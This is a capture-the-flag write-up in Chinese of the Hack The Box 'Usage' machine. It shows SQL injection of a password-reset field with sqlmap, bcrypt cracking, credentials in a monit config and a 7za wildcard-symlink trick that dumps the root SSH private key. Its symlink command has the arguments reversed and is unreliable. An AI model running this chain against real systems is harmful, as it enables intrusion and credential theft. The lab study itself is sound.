---
layout: post
title: HTB——Usage
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Usage/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                                  
[2025-04-12 11:22:04] [INFO] 暴力破解线程数: 1                                                    
[2025-04-12 11:22:04] [INFO] 开始信息扫描
[2025-04-12 11:22:04] [INFO] 最终有效主机数量: 1
[2025-04-12 11:22:04] [INFO] 开始主机扫描
[2025-04-12 11:22:04] [INFO] 有效端口数量: 233
[2025-04-12 11:22:05] [SUCCESS] 端口开放 10.129.223.186:80
[2025-04-12 11:22:05] [SUCCESS] 端口开放 10.129.223.186:22
[2025-04-12 11:22:05] [SUCCESS] 服务识别 10.129.223.186:22 => [ssh] 版本:8.9p1 Ubuntu 3ubuntu0.6 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6.]                                                                                           
[2025-04-12 11:22:10] [SUCCESS] 服务识别 10.129.223.186:80 => [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu                                                                                  
[2025-04-12 11:22:10] [INFO] 存活端口数量: 2
[2025-04-12 11:22:10] [INFO] 开始漏洞扫描
[2025-04-12 11:22:10] [INFO] 加载的插件: ssh, webpoc, webtitle
[2025-04-12 11:22:10] [SUCCESS] 网站标题 http://10.129.223.186     状态码:301 长度:178    标题:301 Moved Permanently 重定向地址: http://usage.htb/                                                  
[2025-04-12 11:22:11] [SUCCESS] 网站标题 http://usage.htb/         状态码:200 长度:5141   标题:Daily Blogs                                                                                          
[2025-04-12 11:22:11] [SUCCESS] 发现指纹 目标: http://usage.htb/         指纹: [Laravel]
[2025-04-12 11:22:44] [SUCCESS] 扫描已完成: 3/3
```

使用`ffuf`爆破子域名，我们能得到第二个子域名

```bash
┌──(root㉿kali)-[/home/kali]
└─# ffuf -u http://usage.htb -H "Host: FUZZ.usage.htb" -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://usage.htb
 :: Wordlist         : FUZZ: /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt
 :: Header           : Host: FUZZ.usage.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

admin                   [Status: 200, Size: 3304, Words: 493, Lines: 89, Duration: 252ms]
:: Progress: [20000/20000] :: Job [1/1] :: 248 req/sec :: Duration: [0:01:12] :: Errors: 0 ::
```

---

# 0x02 经典sqlmap+hashcat

在修改密码页面有键入email的功能，此点可以使用sqlmap进行注入。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Usage]
└─# sqlmap -r sample.txt --level=3 --dbms=mysql -D usage_blog -T admin_users -C username,password --dump
        ___
       __H__                                                                                     
 ___ ___[,]_____ ___ ___  {1.9.3#stable}                                                         
|_ -| . [)]     | .'| . |                                                                        
|___|_  [.]_|_|_|__,|  _|                                                                        
      |_|V...       |_|   https://sqlmap.org                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:15:33 /2025-04-12/

[12:15:33] [INFO] parsing HTTP request from 'sample.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] 

Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] 

[12:15:34] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] 

redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] 

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=5nUUbRFdVPU5XWjs5msOBK7e0sOWolmQsabiUMf2&email=123@qq.com' AND 8614=(SELECT (CASE WHEN (8614=8614) THEN 8614 ELSE (SELECT 3354 UNION SELECT 7040) END))-- -
---
[12:15:36] [INFO] testing MySQL
[12:15:36] [INFO] confirming MySQL
[12:15:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[12:15:36] [INFO] fetching entries of column(s) 'password,username' for table 'admin_users' in database 'usage_blog'
[12:15:36] [INFO] fetching number of column(s) 'password,username' entries for table 'admin_users' in database 'usage_blog'
[12:15:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[12:15:36] [INFO] retrieved: 
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] 

1
[12:15:39] [INFO] retrieved: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
[12:19:50] [INFO] retrieved: admin
Database: usage_blog
Table: admin_users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+----------+--------------------------------------------------------------+

[12:20:05] [INFO] table 'usage_blog.admin_users' dumped to CSV file '/root/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv'                                                  
[12:20:05] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 228 times
[12:20:05] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'                                                                                            

[*] ending @ 12:20:05 /2025-04-12/
```

我们使用hashcat搜索此密文格式，并尝试爆破出此密码

```bash
PS S:\tools\hashcat> .\hashcat.exe -h | findstr '$2'
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
PS S:\tools\hashcat> .\hashcat.exe -a 0 -m 3200 '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' rockyou.txt
hashcat (v6.2.6) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

OpenCL API (OpenCL 3.0 CUDA 12.8.97) - Platform #1 [NVIDIA Corporation]
=======================================================================
* Device #1: NVIDIA GeForce RTX 5080 Laptop GPU, 16192/16302 MB (4075 MB allocatable), 60MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 181 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344393
* Bytes.....: 139921351
* Keyspace..: 14344386
* Runtime...: 0 secs

$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH...fUPrL2
Time.Started.....: Sat Apr 12 20:06:47 2025 (1 sec)
Time.Estimated...: Sat Apr 12 20:06:48 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3286 H/s (6.21ms) @ Accel:4 Loops:8 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2640/14344386 (0.02%)
Rejected.........: 0/2640 (0.00%)
Restore.Point....: 0/14344386 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: bulldogs -> lilfizz
Hardware.Mon.#1..: Temp: 51c Util:100% Core:2835MHz Mem:14001MHz Bus:8

Started: Sat Apr 12 20:06:42 2025
Stopped: Sat Apr 12 20:06:50 2025
```

爆破出来后我们尝试登录。在后台界面看到`lavarel-admin`的组件提示，且此组件的版本显示为`1.8.17`

使用此CVE复现，我们就可以将webshell上传上去并获取`dash`用户的shell

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Usage/02.png?raw=true)

在当前该角色home下查找，我们可以找到一个密码

```bash
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

---

# 0x03 strings搭配软连接利用备份指令

经测试此密码可以使用`xander`用户来登录。我们登陆上xander用户，发现其拥有一个特权指令。

```bash
xander@usage:/home/dash$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

使用`string`查看内部可见字符串，我们看见了一些奇怪的信息：
`/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *`

其会在备份时打包工作目录下的所有文件为一个zip保存。那如果我们在工作目录下创建一个软连接指向root目录，那么其就可以将root目录也打包下来。

```bash
touch @id_rsa
ln -s id_rsa /root/.ssh/id_rsa
```

最后运行其中的backup指令，将zip文件拿下来检查就可以看到其中的`root`密钥了。

```bash
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54830063

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----
```

拿到密钥后即获得了root账户的控制权

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Usage/03.png?raw=true)

---